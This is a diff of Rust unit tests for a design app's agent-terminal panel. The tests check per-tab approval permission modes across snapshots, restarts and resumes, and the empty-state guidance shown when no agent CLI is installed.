+    fn two_running_tabs_with_different_modes_keep_their_own_approval_behavior_across_canvas_snapshots() {
+        use crate::agent_permissions::{save_permission_mode, AgentPermissionMode, ApprovalDecision};
+        const SAFE_READ_PAYLOAD: &str = r#"{"tool_name":"mcp__designos__designos_get_document","tool_input":{}}"#;
+
+        let root = permission_window_root("two-tabs-different-modes");
+        let bin_dir = root.join("bin");
+        write_idle_stub_clis(&bin_dir);
+        save_permission_mode(&root, AgentPermissionMode::Ask).expect("save Ask");
+
+        let mut app = crate::app::App::new(designos_doc::Document::new("Two Tabs Different Modes"));
+        app.lib = Some(designos_library::Library::open(&root).expect("open library"));
+        app.terminal.bind_library_file(&root, "file-two-tabs", "win-two-tabs");
+        app.terminal.path_override = Some(bin_dir.clone().into_os_string());
+        app.terminal.path_prepend = vec![bin_dir.clone()];
+        app.set_agent_permission_mode(AgentPermissionMode::Ask);
+
+        // Tab A starts in Ask first.
+        let tab_a_idx = app.terminal.spawn_tab(AgentCliPreset::Claude, None).expect("spawn tab A in Ask");
+        let tab_a_id = app.terminal.tabs[tab_a_idx].id;
+        assert_eq!(app.terminal.tabs[tab_a_idx].permission_mode, AgentPermissionMode::Ask);
+
+        // Switch global mode to AskRisky and start Tab B (Tab A is now in the background, Tab B is active).
+        app.set_agent_permission_mode(AgentPermissionMode::AskRisky);
+        let tab_b_idx = app.terminal.spawn_tab(AgentCliPreset::Claude, None).expect("spawn tab B in AskRisky");
+        let tab_b_id = app.terminal.tabs[tab_b_idx].id;
+        assert_eq!(app.terminal.active_tab, tab_b_idx);
+        assert_eq!(app.terminal.tabs[tab_a_idx].permission_mode, AgentPermissionMode::Ask);
+        assert_eq!(app.terminal.tabs[tab_b_idx].permission_mode, AgentPermissionMode::AskRisky);
+
+        // Canvas snapshot runs while Tab B (AskRisky) is active and Tab A (Ask) is in the background.
+        let page = app.doc.pages.first().copied().unwrap_or(designos_doc::NodeId(1));
+        app.doc.name = "Snapshot With Risky Tab Active".to_string();
+        app.terminal.sync_live_file_context(&app.doc, page, &[], None);
+        app.terminal.flush_live_sync();
+
+        let script_path = crate::agent_approval_channel::hook_script_path(&app.terminal.session_dir).expect("private hook script path");
+
+        // Tab A (Ask, background) must NOT be weakened: a safe read tool must still ask.
+        let child_a = spawn_tab_approval_hook(&script_path, tab_a_id, SAFE_READ_PAYLOAD);
+        let a_asked = crate::test_timing::poll_until(std::time::Duration::from_millis(1200), || {
+            let _ = app.terminal.poll_live_agent_bridge();
+            !app.terminal.tabs[tab_a_idx].pending_approvals.is_empty()
+        });
+        assert!(a_asked, "background Ask tab A must still ask after a canvas snapshot while AskRisky tab B is active");
+        let req_id = app.terminal.tabs[tab_a_idx].pending_approvals[0].id.clone();
+        app.terminal.focus_tab_by_id(tab_a_id);
+        app.terminal.answer_pending_approval(&req_id, ApprovalDecision::Allow);
+        let out_a = child_a.wait_with_output().expect("wait for tab A hook");
+        assert!(String::from_utf8_lossy(&out_a.stdout).contains("\"behavior\":\"allow\""));
+
+        // Now Tab A (Ask) is active and Tab B (AskRisky) is in the background; run a canvas snapshot in the other direction.
+        assert_eq!(app.terminal.active_tab, tab_a_idx);
+        app.doc.name = "Snapshot With Ask Tab Active".to_string();
+        app.terminal.sync_live_file_context(&app.doc, page, &[], None);
+        app.terminal.flush_live_sync();
+
+        // Tab B (AskRisky, background) must still auto-allow safe read tools without raising a card.
+        let out_b = spawn_tab_approval_hook(&script_path, tab_b_id, SAFE_READ_PAYLOAD).wait_with_output().expect("wait for tab B hook");
+        let stdout_b = String::from_utf8_lossy(&out_b.stdout);
+        assert!(
+            stdout_b.contains("\"behavior\":\"allow\""),
+            "AskRisky tab B must still auto-allow safe tools after a canvas snapshot while Ask tab A is active: {stdout_b}"
+        );
+        let _ = app.terminal.poll_live_agent_bridge();
+        assert!(app.terminal.tabs[tab_b_idx].pending_approvals.is_empty(), "auto-allowed tool on Tab B leaves no pending request");
+
+        kill_tabs(&mut app.terminal);
+        app.terminal.shutdown();
+        let _ = std::fs::remove_dir_all(&root);
+    }
+
+    #[cfg(unix)]
+    #[test]
+    fn restarted_and_resumed_tabs_take_the_mode_selected_when_they_restart_and_keep_refusing_unsupported_clis_in_ask_risky() {
+        use crate::agent_permissions::{ask_risky_unsupported_reason, save_permission_mode, AgentPermissionMode};
+        use crate::agent_start_failure::FixAction;
+
+        let root = permission_window_root("restart-and-resume-modes");
+        let bin_dir = root.join("bin");
+        write_idle_stub_clis(&bin_dir);
+        save_permission_mode(&root, AgentPermissionMode::Ask).expect("save Ask");
+
+        let mut app = crate::app::App::new(designos_doc::Document::new("Restart And Resume"));
+        app.lib = Some(designos_library::Library::open(&root).expect("open library"));
+        app.terminal.bind_library_file(&root, "file-restart-resume", "win-restart-resume");
+        app.terminal.path_override = Some(bin_dir.clone().into_os_string());
+        app.terminal.path_prepend = vec![bin_dir.clone()];
+        app.terminal.codex_cwd_scoped = true;
+        app.set_agent_permission_mode(AgentPermissionMode::Ask);
+
+        // Start a Claude tab in Ask, then switch global mode to AskRisky and restart via FixAction::NewSession.
+        let first_idx = app.terminal.spawn_tab(AgentCliPreset::Claude, None).expect("spawn initial Claude tab in Ask");
+        assert_eq!(app.terminal.tabs[first_idx].permission_mode, AgentPermissionMode::Ask);
+
+        app.set_agent_permission_mode(AgentPermissionMode::AskRisky);
+        app.terminal.apply_start_fix(FixAction::NewSession, None);
+        assert_eq!(app.terminal.tabs.len(), 2, "NewSession spawns a restarted tab");
+        let restarted_idx = app.terminal.active_tab;
+        assert_eq!(app.terminal.tabs[first_idx].permission_mode, AgentPermissionMode::Ask, "original tab keeps Ask");
+        assert_eq!(
+            app.terminal.tabs[restarted_idx].permission_mode,
+            AgentPermissionMode::AskRisky,
+            "restarted tab takes the AskRisky mode selected when it restarted"
+        );
+
+        // Record an exited Claude session and resume it after switching global mode to Skip, then AskRisky.
+        let entry = crate::agent_sessions::SessionEntry {
+            tab_id: 90,
+            title: "Claude Code #90".into(),
+            cli: "claude".into(),
+            session_id: Some("11111111-2222-4333-8444-555555555555".into()),
+            created_at: 10,
+            last_active_at: 20,
+            status: crate::agent_sessions::SessionEntryStatus::Exited,
+            extra: Default::default(),
+        };
+        app.terminal.session_registry.sessions.push(entry);
+
+        app.set_agent_permission_mode(AgentPermissionMode::Skip);
+        let resumed_skip_idx = app.terminal.resume_session_by_tab_id(90, None).expect("resume Claude in Skip");
+        assert_eq!(app.terminal.tabs[resumed_skip_idx].permission_mode, AgentPermissionMode::Skip, "resumed tab takes the Skip mode selected when it resumed");
+
+        // Start a Codex tab in Ask, switch global mode to AskRisky: both restarting (NewSession) and resuming Codex stay refused.
+        app.set_agent_permission_mode(AgentPermissionMode::Ask);
+        let codex_idx = app.terminal.spawn_tab(AgentCliPreset::Codex, None).expect("Codex starts in Ask");
+        assert_eq!(app.terminal.tabs[codex_idx].permission_mode, AgentPermissionMode::Ask);
+        let codex_tab_id = 91;
+        app.terminal.session_registry.sessions.push(crate::agent_sessions::SessionEntry {
+            tab_id: codex_tab_id,
+            title: "Codex #91".into(),
+            cli: "codex".into(),
+            session_id: None,
+            created_at: 25,
+            last_active_at: 30,
+            status: crate::agent_sessions::SessionEntryStatus::Exited,
+            extra: Default::default(),
+        });
+
+        app.set_agent_permission_mode(AgentPermissionMode::AskRisky);
+        let tabs_before = app.terminal.tabs.len();
+        app.terminal.active_tab = codex_idx;
+        app.terminal.apply_start_fix(FixAction::NewSession, None);
+        assert_eq!(app.terminal.tabs.len(), tabs_before, "restarting Codex in AskRisky must be refused");
+        assert_eq!(app.terminal.status_msg.as_deref(), ask_risky_unsupported_reason(AgentCliPreset::Codex));
+
+        let err = app.terminal.resume_session_by_tab_id(codex_tab_id, None).expect_err("resuming Codex in AskRisky must be refused");
+        assert_eq!(Some(err.as_str()), ask_risky_unsupported_reason(AgentCliPreset::Codex));
+
+        kill_tabs(&mut app.terminal);
+        app.terminal.shutdown();
+        let _ = std::fs::remove_dir_all(&root);
+    }
+
+    /// Runs last among the tests `real_cli_launch_tests` starts in a child process (the name sorts after theirs), so that a CLI
+    /// the earlier tests started in the background has run before the child exits. Skipped in a normal run.
+    #[test]
+    #[ignore = "only the real-CLI launch check runs this, last, in a child process"]
+    fn zz_let_background_launches_finish() {
+        std::thread::sleep(std::time::Duration::from_millis(1500));
     }
 
     #[test]
-    fn no_cli_installed_shows_install_guidance() {
-        const NO_CLI_LINE: &str = "No agent CLI found. Install one to start.";
+    fn no_cli_installed_guides_through_the_menu_and_placeholder() {
+        const PLACEHOLDER: &str = "No agent CLI found. Open the agent menu to install one.";
         let ctx = egui::Context::default();
         crate::theme::install_fonts(&ctx);
         crate::theme::apply(&ctx);
-        let panel_rect = Rect::from_min_size(Pos2::new(48.0, 0.0), Vec2::new(320.0, 1400.0));
-        let screen = Rect::from_min_size(Pos2::ZERO, Vec2::new(1600.0, 1500.0));
+        let panel_rect = Rect::from_min_size(Pos2::new(48.0, 0.0), Vec2::new(420.0, 1000.0));
+        let screen = Rect::from_min_size(Pos2::ZERO, Vec2::new(1600.0, 1100.0));
 
         let mut st = isolated_683_state(68804);
-        st.side_panel_pty_open = false;
-        st.chat_mode = true;
         st.path_override = Some(std::ffi::OsString::new());
         pin_installed_catalog_clis(&mut st, &[]);
         assert!(!st.any_agent_cli_installed(), "no probed CLI, empty PATH and no saved CLI must report no agent CLI installed");
+        let paint = |st: &mut TerminalState, events: Vec<egui::Event>| {
+            let out = ctx.run_ui(egui::RawInput { screen_rect: Some(screen), events, ..Default::default() }, |ui| {
+                let _ = show_left(st, ui, panel_rect, None);
+            });
+            let (texts, boxes) = crate::lint::scan_shapes(&out.shapes);
+            assert!(crate::lint::check_text(&texts, &boxes).is_empty(), "no-CLI guidance must pass text layout lint");
+            texts.into_iter().map(|t| t.text.replace('\n', "")).collect::<Vec<_>>()
+        };
 
-        let out = ctx.run_ui(egui::RawInput { screen_rect: Some(screen), ..Default::default() }, |ui| {
-            let _ = show_left(&mut st, ui, panel_rect, None);
-        });
-        let (texts, boxes) = crate::lint::scan_shapes(&out.shapes);
-        assert!(crate::lint::check_text(&texts, &boxes).is_empty(), "no-CLI guidance must pass text layout lint");
-        let painted: String = texts.iter().map(|t| t.text.as_str()).collect::<Vec<_>>().join(" ");
-        let flat = painted.split_whitespace().collect::<Vec<_>>().join(" ");
-        assert!(flat.contains(NO_CLI_LINE), "the no-CLI sentence must be painted in full: {flat:?}");
-        assert!(
-            ctx.data(|d| d.get_temp::<Rect>(Id::new(("test-rect", "agents-new-session-picker".to_string())))).is_some(),
-            "with no session open the #652 picker carries the install guidance"
-        );
-
+        let painted = paint(&mut st, vec![]);
+        assert!(painted.iter().any(|t| t == "Choose agent"), "the pill asks for an agent: {painted:?}");
+        assert!(painted.iter().any(|t| t == PLACEHOLDER), "the placeholder guides to the menu: {painted:?}");
+        assert!(ctx.data(|d| d.get_temp::<Rect>(Id::new(("test-rect", "agents-new-session-picker".to_string())))).is_none(), "no body picker card");
         for idx in 0..6 {
             assert!(
                 ctx.data(|d| d.get_temp::<Rect>(Id::new(("test-rect", format!("agents-sample-prompt-{idx}"))))).is_none(),
-                "sample prompt row {idx} must NOT be recorded when no CLI is installed"
+                "sample prompt row {idx} must NOT be recorded"
             );
         }
 
-        // With a session already open the empty state keeps the install links of each CLI.
-        let ctx2 = egui::Context::default();
-        crate::theme::install_fonts(&ctx2);
-        crate::theme::apply(&ctx2);
-        st.spawn_tab(AgentCliPreset::Shell, None).expect("spawn shell tab");
-        let _ = ctx2.run_ui(egui::RawInput { screen_rect: Some(screen), ..Default::default() }, |ui| {
-            let _ = show_left(&mut st, ui, panel_rect, None);
-        });
-        for id in ["agents-install-claude", "agents-install-codex", "agents-install-agy", "agents-install-grok"] {
-            assert!(
-                ctx2.data(|d| d.get_temp::<Rect>(Id::new(("test-rect", id.to_string())))).is_some(),
-                "install guidance row {id} must be recorded when no CLI is installed"
-            );
-        }
+        // Send is disabled: a click starts nothing and keeps the draft.
+        st.set_composer_draft("hello");
+        let _ = paint(&mut st, vec![]);
+        let send: Rect = ctx.data(|d| d.get_temp(Id::new(("test-rect", "agents-composer-send".to_string())))).expect("send is drawn");
+        let pos = send.center();
+        let click = vec![
+            egui::Event::PointerMoved(pos),
+            egui::Event::PointerButton { pos, button: egui::PointerButton::Primary, pressed: true, modifiers: egui::Modifiers::NONE },
+            egui::Event::PointerButton { pos, button: egui::PointerButton::Primary, pressed: false, modifiers: egui::Modifiers::NONE },
+        ];
+        let _ = paint(&mut st, click);
+        assert!(st.tabs.is_empty(), "a disabled Send starts nothing");
+        assert_eq!(st.composer_draft(), "hello", "the draft is kept");
+        // Enter takes the same path as Send: with no agent to start it does nothing and keeps the draft.
+        let outcome = st.send_from_composer_box("hello", None);
+        assert_eq!(outcome, crate::agent_composer::SendOutcome::Refused(crate::agent_composer::RefuseReason::NoAgent));
+        assert_eq!(st.composer_draft(), "hello", "Enter keeps the draft too");
+        assert!(st.tabs.is_empty() && st.active_composer().pending_send.is_empty(), "and queues nothing for a later agent");
+
+        // The agent menu names the way out: every built-in row offers Install.
+        st.runtime_dropdown_open = true;
+        let menu = paint(&mut st, vec![]);
+        assert!(menu.iter().filter(|t| t.as_str() == "Install").count() >= 4, "uninstalled rows offer Install: {menu:?}");
         kill_tabs(&mut st);
-    }
-
-    #[test]
-    fn old_category_cards_are_gone() {
-        let ctx = egui::Context::default();
-        crate::theme::install_fonts(&ctx);
-        crate::theme::apply(&ctx);
-        let panel_rect = Rect::from_min_size(Pos2::new(48.0, 0.0), Vec2::new(320.0, 800.0));
-        let mut st = isolated_683_state(68805);
-        st.side_panel_pty_open = false;
-        st.chat_mode = true;
-
-        let out = ctx.run_ui(egui::RawInput { screen_rect: Some(Rect::from_min_size(Pos2::ZERO, Vec2::new(1600.0, 900.0))), ..Default::default() }, |ui| {
-            let _ = show_left(&mut st, ui, panel_rect, None);
-        });
-        for retired_id in [
-            "agents-cat-tidy",
-            "agents-cat-generate",
-            "agents-cat-plugins",
-            "agents-cat-prd",
-            "term-ai-rename-layers",
-            "term-ai-design-gate",
-            "term-ai-translate",
-            "term-ai-make-design",
-            "term-ai-make-proto",
-            "term-ai-populate",
-        ] {
-            assert!(
-                ctx.data(|d| d.get_temp::<Rect>(Id::new(("test-rect", retired_id.to_string())))).is_none(),
-                "retired category/action id {retired_id} must not be recorded"
-            );
-        }
-        assert!(
-            ctx.data(|d| d.get_temp::<Rect>(Id::new(("test-rect", "agents-empty-attach-hint".to_string())))).is_some(),
-            "the @-mention hint (#655) must be recorded under the prompts"
-        );
-        let (texts, _) = crate::lint::scan_shapes(&out.shapes);
-        assert!(texts.iter().any(|t| t.text == "Type @ to mention layers."), "the shipped #655 hint must be painted: {texts:?}");
-        for t in &texts {
-            assert!(!t.text.contains("Click the selection chip"), "the selection chip is not drawn on this surface, so its hint must not be painted");
-        }
-        kill_tabs(&mut st);
-    }
-
-    #[test]
-    fn clicking_sample_prompt_with_empty_tabs_starts_session_on_first_installed_cli() {
-        use crate::agent_sample_prompts::{sample_prompts, PromptContext};
-
-        let stub_dir = std::env::temp_dir().join(format!("designos-688-single-cli-{}", std::process::id()));
-        let _ = std::fs::remove_dir_all(&stub_dir);
-        std::fs::create_dir_all(&stub_dir).expect("create stub_dir");
-        let spawned_marker = stub_dir.join("grok-spawned.txt");
-        let grok_bin = stub_dir.join("grok");
-        let script = format!("#!/bin/sh\necho \"spawned:$*\" > '{}'\n/bin/sleep 5\n", spawned_marker.display());
-        std::fs::write(&grok_bin, script.as_bytes()).expect("write grok stub");
-        #[cfg(unix)]
-        {
-            use std::os::unix::fs::PermissionsExt;
-            std::fs::set_permissions(&grok_bin, std::fs::Permissions::from_mode(0o755)).expect("chmod grok stub");
-        }
-
-        let ctx = egui::Context::default();
-        crate::theme::install_fonts(&ctx);
-        crate::theme::apply(&ctx);
-        let panel_rect = Rect::from_min_size(Pos2::new(48.0, 0.0), Vec2::new(320.0, 800.0));
-
-        let mut doc = Document::new("688 Single Stub CLI");
-        let page = doc.add_page("Page 1");
-        let doc_before = doc.to_json().expect("doc.to_json");
-
-        let mut st = isolated_683_state(68806);
-        st.side_panel_pty_open = false;
-        st.chat_mode = true;
-        st.path_override = Some(stub_dir.as_os_str().to_os_string());
-        pin_installed_catalog_clis(&mut st, &[AgentCliPreset::Grok]);
-        st.sync_live_file_context(&doc, page, &[], None);
-        assert!(st.tabs.is_empty(), "precondition: tab list starts empty");
-        assert_eq!(st.first_installed_agent_cli(), Some(AgentCliPreset::Grok));
-
-        let _ = ctx.run_ui(egui::RawInput { screen_rect: Some(Rect::from_min_size(Pos2::ZERO, Vec2::new(1600.0, 900.0))), ..Default::default() }, |ui| {
-            let _ = show_left(&mut st, ui, panel_rect, None);
-        });
-        assert!(st.tabs.is_empty(), "painting empty state before click must not spawn a Shell tab");
-
-        let row0: Rect = ctx.data(|d| d.get_temp(Id::new(("test-rect", "agents-sample-prompt-0".to_string())))).expect("agents-sample-prompt-0 recorded");
-        let pos = row0.center();
-        let raw = egui::RawInput {
-            screen_rect: Some(Rect::from_min_size(Pos2::ZERO, Vec2::new(1600.0, 900.0))),
-            events: vec![
-                egui::Event::PointerMoved(pos),
-                egui::Event::PointerButton { pos, button: egui::PointerButton::Primary, pressed: true, modifiers: egui::Modifiers::NONE },
-                egui::Event::PointerButton { pos, button: egui::PointerButton::Primary, pressed: false, modifiers: egui::Modifiers::NONE },
-            ],
-            ..Default::default()
-        };
-        let mut actions = Vec::new();
-        let _ = ctx.run_ui(raw, |ui| {
-            actions = show_left(&mut st, ui, panel_rect, None);
-        });
-
-        assert_eq!(st.active_runtime, AgentCliPreset::Grok, "clicking sample prompt must set active_runtime to the first installed CLI");
-        assert_eq!(st.tabs.len(), 1, "clicking sample prompt with no open agent tab must start one session tab");
-        assert_eq!(st.active_tab().unwrap().preset, AgentCliPreset::Grok);
-        assert_eq!(st.active_tab().unwrap().spawn_preset, AgentCliPreset::Grok);
-        assert_eq!(st.composer_draft(), sample_prompts(PromptContext::EmptyFile)[0].text.as_str());
-        assert!(st.active_tab().unwrap().written_bytes.is_empty(), "clicking sample prompt must not send anything");
-        assert!(actions.is_empty(), "clicking sample prompt must emit no TerminalAction");
-        assert_eq!(doc.to_json().expect("doc.to_json"), doc_before, "canvas document must be unchanged");
-        assert!(ctx.memory(|m| m.has_focus(Id::new("agents-ask-for-changes-input"))), "composer input must be focused");
-
-        kill_tabs(&mut st);
-        let _ = std::fs::remove_dir_all(&stub_dir);
     }
 
     #[test]
@@ -11193,80 +12709,6 @@ mod tests {
         kill_tabs(&mut st);
     }
 
-    #[test]
-    fn clicking_sample_prompt_when_existing_agent_tab_has_exited_spawns_new_live_agent_tab() {
-        use crate::agent_sample_prompts::{sample_prompts, PromptContext};
-
-        let ctx = egui::Context::default();
-        crate::theme::install_fonts(&ctx);
-        crate::theme::apply(&ctx);
-        let panel_rect = Rect::from_min_size(Pos2::new(48.0, 0.0), Vec2::new(320.0, 800.0));
-        // The click starts a new Claude session. Only a stub `claude` that stays alive is reachable, so the test never
-        // launches a real agent CLI and does not depend on what the host has installed.
-        let stub_dir = install_stub_claude("exited-tab-respawn");
-
-        let mut st = isolated_683_state(68808);
-        st.side_panel_pty_open = false;
-        st.chat_mode = true;
-        spawn_stub_exiting_agent_into(&mut st);
-        let deadline = std::time::Instant::now() + crate::test_timing::STUB_WAIT;
-        while st.active_tab_mut().unwrap().is_alive() {
-            assert!(std::time::Instant::now() < deadline, "stub agent must exit");
-            std::thread::sleep(std::time::Duration::from_millis(20));
-        }
-        assert!(!st.tabs[0].accepts_agent_input(), "precondition: initial agent tab has exited");
-        st.tabs[0].composer.draft = "Keep the header intact.".to_string();
-        st.path_override = Some(stub_dir.as_os_str().to_os_string());
-        pin_installed_catalog_clis(&mut st, &[AgentCliPreset::Claude]);
-        assert_eq!(st.first_installed_agent_cli(), Some(AgentCliPreset::Claude), "precondition: the click starts the stub Claude");
-
-        let _ = ctx.run_ui(egui::RawInput { screen_rect: Some(Rect::from_min_size(Pos2::ZERO, Vec2::new(1600.0, 900.0))), ..Default::default() }, |ui| {
-            let _ = show_left(&mut st, ui, panel_rect, None);
-        });
-        let row0: Rect = ctx.data(|d| d.get_temp(Id::new(("test-rect", "agents-sample-prompt-0".to_string())))).expect("agents-sample-prompt-0 recorded");
-        let pos = row0.center();
-        let raw = egui::RawInput {
-            screen_rect: Some(Rect::from_min_size(Pos2::ZERO, Vec2::new(1600.0, 900.0))),
-            events: vec![
-                egui::Event::PointerMoved(pos),
-                egui::Event::PointerButton { pos, button: egui::PointerButton::Primary, pressed: true, modifiers: egui::Modifiers::NONE },
-                egui::Event::PointerButton { pos, button: egui::PointerButton::Primary, pressed: false, modifiers: egui::Modifiers::NONE },
-            ],
-            ..Default::default()
-        };
-        let _ = ctx.run_ui(raw, |ui| {
-            let _ = show_left(&mut st, ui, panel_rect, None);
-        });
-
-        // A CLI that cannot start exits within milliseconds. Wait past that window so the liveness check below cannot
-        // be won by a race against the child's exit.
-        std::thread::sleep(std::time::Duration::from_millis(300));
-        assert_eq!(st.tabs.len(), 2, "clicking sample prompt when existing agent tab has exited must spawn a new session tab");
-        assert_eq!(st.active_tab, 1, "newly spawned agent tab must be selected");
-        assert_eq!(st.tabs[1].spawn_preset, AgentCliPreset::Claude, "the click starts the first installed CLI");
-        assert!(st.active_tab_mut().unwrap().accepts_agent_input(), "newly spawned agent tab must accept input");
-        assert_eq!(
-            st.composer_draft(),
-            format!("Keep the header intact. {}", sample_prompts(PromptContext::NoSelection)[0].text),
-            "the text typed into the exited tab moves to the new tab and the prompt is appended"
-        );
-        assert!(st.tabs[0].composer.draft.is_empty(), "the draft is moved, not copied: the exited tab keeps nothing");
-        kill_tabs(&mut st);
-        let _ = std::fs::remove_dir_all(&stub_dir);
-    }
-
-    /// Pins the picker's cached probes so exactly `installed` count as installed CLIs, whatever the host machine has.
-    fn pin_installed_catalog_clis(st: &mut TerminalState, installed: &[AgentCliPreset]) {
-        for preset in crate::agent_cli_catalog::CATALOG_PRESETS {
-            let probe = crate::agent_cli_catalog::CliProbe {
-                installed: installed.contains(&preset),
-                version: None,
-                signed_in: crate::agent_cli_catalog::SignIn::Unknown,
-            };
-            st.picker.cache.set_probe(preset, probe);
-        }
-    }
-
     fn install_stub_claude(tag: &str) -> PathBuf {
         let dir = std::env::temp_dir().join(format!("designos-688-{tag}-{}", std::process::id()));
         let _ = std::fs::remove_dir_all(&dir);
@@ -11285,117 +12727,7 @@ mod tests {
         ctx.data(|d| d.get_temp::<Rect>(Id::new(("test-rect", id.to_string()))))
     }
 
-    /// The `#652` picker sits on top of the sample prompts while no session is open and leaves once one is (`#688` §3 rule 3).
-    #[test]
-    fn picker_sits_above_the_sample_prompts_until_a_session_opens() {
-        let stub_dir = install_stub_claude("layout");
-        let panel_rect = Rect::from_min_size(Pos2::new(48.0, 0.0), Vec2::new(320.0, 1400.0));
-        let screen = Rect::from_min_size(Pos2::ZERO, Vec2::new(1600.0, 1500.0));
-        let mut doc = Document::new("688 Layout");
-        let page = doc.add_page("Page 1");
-
-        let ctx = egui::Context::default();
-        crate::theme::install_fonts(&ctx);
-        crate::theme::apply(&ctx);
-        let mut st = isolated_683_state(68812);
-        st.side_panel_pty_open = false;
-        st.chat_mode = true;
-        st.path_override = Some(stub_dir.as_os_str().to_os_string());
-        st.sync_live_file_context(&doc, page, &[], None);
-        assert!(st.tabs.is_empty(), "precondition: no session is open");
-        let _ = ctx.run_ui(egui::RawInput { screen_rect: Some(screen), ..Default::default() }, |ui| {
-            let _ = show_left(&mut st, ui, panel_rect, None);
-        });
-        let picker = empty_state_rect(&ctx, "agents-new-session-picker").expect("the picker is drawn while no session is open");
-        let first_prompt = empty_state_rect(&ctx, "agents-sample-prompt-0").expect("the sample prompts are drawn below the picker");
-        assert!(first_prompt.top() >= picker.bottom(), "prompts must sit below the picker: picker={picker:?} prompt={first_prompt:?}");
-
-        let ctx2 = egui::Context::default();
-        crate::theme::install_fonts(&ctx2);
-        crate::theme::apply(&ctx2);
-        st.spawn_tab(AgentCliPreset::Claude, None).expect("spawn claude stub");
-        let _ = ctx2.run_ui(egui::RawInput { screen_rect: Some(screen), ..Default::default() }, |ui| {
-            let _ = show_left(&mut st, ui, panel_rect, None);
-        });
-        assert!(empty_state_rect(&ctx2, "agents-new-session-picker").is_none(), "the picker leaves once a session is open");
-        assert!(empty_state_rect(&ctx2, "agents-sample-prompt-0").is_some(), "the prompts stay while the session has no conversation");
-        kill_tabs(&mut st);
-        let _ = std::fs::remove_dir_all(&stub_dir);
-    }
-
-    /// A panel too short for the picker plus the prompts scrolls the empty state (`#688` §3 rule 3, §8 rule 7).
-    #[test]
-    fn the_empty_state_scrolls_when_the_picker_and_prompts_do_not_fit() {
-        let stub_dir = install_stub_claude("scroll");
-        let panel_rect = Rect::from_min_size(Pos2::new(48.0, 0.0), Vec2::new(320.0, 640.0));
-        let screen = Rect::from_min_size(Pos2::ZERO, Vec2::new(1600.0, 900.0));
-        let mut doc = Document::new("688 Scroll");
-        let page = doc.add_page("Page 1");
-
-        let ctx = egui::Context::default();
-        crate::theme::install_fonts(&ctx);
-        crate::theme::apply(&ctx);
-        let mut st = isolated_683_state(68809);
-        st.side_panel_pty_open = false;
-        st.chat_mode = true;
-        st.path_override = Some(stub_dir.as_os_str().to_os_string());
-        st.sync_live_file_context(&doc, page, &[], None);
-        let _ = ctx.run_ui(egui::RawInput { screen_rect: Some(screen), ..Default::default() }, |ui| {
-            let _ = show_left(&mut st, ui, panel_rect, None);
-        });
-        let before = empty_state_rect(&ctx, "agents-sample-prompt-0").expect("prompt row recorded");
-        assert_eq!(st.left_scroll, 0.0);
-
-        let over_panel = Pos2::new(panel_rect.center().x, panel_rect.top() + 200.0);
-        let wheel = egui::RawInput {
-            screen_rect: Some(screen),
-            events: vec![
-                egui::Event::PointerMoved(over_panel),
-                egui::Event::MouseWheel {
-                    unit: egui::MouseWheelUnit::Point,
-                    delta: Vec2::new(0.0, -120.0),
-                    phase: egui::TouchPhase::Move,
-                    modifiers: egui::Modifiers::NONE,
-                },
-            ],
-            ..Default::default()
-        };
-        let _ = ctx.run_ui(wheel, |ui| {
-            let _ = show_left(&mut st, ui, panel_rect, None);
-        });
-        let _ = ctx.run_ui(egui::RawInput { screen_rect: Some(screen), ..Default::default() }, |ui| {
-            let _ = show_left(&mut st, ui, panel_rect, None);
-        });
-        let after = empty_state_rect(&ctx, "agents-sample-prompt-0").expect("prompt row recorded");
-        assert!(st.left_scroll > 0.0, "a wheel over the empty state must scroll it");
-        assert!(after.top() < before.top(), "the prompt rows move up with the scroll: before={before:?} after={after:?}");
-        kill_tabs(&mut st);
-        let _ = std::fs::remove_dir_all(&stub_dir);
-    }
-
-    /// The default terminal view keeps the `#652` picker on top and shows the starter prompts under it (`#688` §3 rule 3).
-    #[test]
-    fn the_default_terminal_view_shows_the_prompts_under_the_picker() {
-        let stub_dir = install_stub_claude("default-view");
-        let panel_rect = Rect::from_min_size(Pos2::new(48.0, 0.0), Vec2::new(320.0, 1400.0));
-        let screen = Rect::from_min_size(Pos2::ZERO, Vec2::new(1600.0, 1500.0));
-        let ctx = egui::Context::default();
-        crate::theme::install_fonts(&ctx);
-        crate::theme::apply(&ctx);
-        let mut st = isolated_683_state(68810);
-        assert!(st.side_panel_pty_open, "precondition: the default view is the terminal");
-        st.path_override = Some(stub_dir.as_os_str().to_os_string());
-        let _ = ctx.run_ui(egui::RawInput { screen_rect: Some(screen), ..Default::default() }, |ui| {
-            let _ = show_left(&mut st, ui, panel_rect, None);
-        });
-        let picker = empty_state_rect(&ctx, "agents-new-session-picker").expect("the picker is drawn while no session is open");
-        let first_prompt = empty_state_rect(&ctx, "agents-sample-prompt-0").expect("the starter prompts are drawn under the picker in the terminal view");
-        assert!(first_prompt.top() >= picker.bottom(), "prompts must sit below the picker: picker={picker:?} prompt={first_prompt:?}");
-        kill_tabs(&mut st);
-        let _ = std::fs::remove_dir_all(&stub_dir);
-    }
-
-    /// Gemini and OpenCode count as installed agent CLIs, so a user with only one of them still gets the prompts (`#688` §3 rule 6).
+    /// Gemini and OpenCode count as installed agent CLIs, so a user with only one of them is not told that none was found.
     #[test]
     fn a_gemini_only_machine_is_not_told_that_no_agent_cli_was_found() {
         let dir = std::env::temp_dir().join(format!("designos-688-gemini-only-{}", std::process::id()));
@@ -11429,14 +12761,14 @@ mod tests {
         crate::theme::apply(&ctx);
         let panel_rect = Rect::from_min_size(Pos2::new(48.0, 0.0), Vec2::new(320.0, 1400.0));
         let screen = Rect::from_min_size(Pos2::ZERO, Vec2::new(1600.0, 1500.0));
-        st.side_panel_pty_open = false;
-        st.chat_mode = true;
+        st.path_override = Some(dir.as_os_str().to_os_string());
+        pin_installed_catalog_clis(&mut st, &[AgentCliPreset::Gemini]);
         let out = ctx.run_ui(egui::RawInput { screen_rect: Some(screen), ..Default::default() }, |ui| {
             let _ = show_left(&mut st, ui, panel_rect, None);
         });
         let (texts, _) = crate::lint::scan_shapes(&out.shapes);
-        assert!(!texts.iter().any(|t| t.text.contains("No agent CLI")), "a machine with an agent CLI must not see the no-CLI line: {texts:?}");
-        assert!(empty_state_rect(&ctx, "agents-sample-prompt-0").is_some(), "the prompts are drawn when any agent CLI is installed");
+        assert!(!texts.iter().any(|t| t.text.contains("No agent CLI")), "a machine with an agent CLI must not see the no-CLI placeholder: {texts:?}");
+        assert!(texts.iter().any(|t| t.text.starts_with("Ask ")), "the placeholder names the agent a Send would start: {texts:?}");
         kill_tabs(&mut st);
         let _ = std::fs::remove_dir_all(&dir);
         let _ = std::fs::remove_dir_all(&only_opencode);
@@ -11448,50 +12780,6 @@ mod tests {
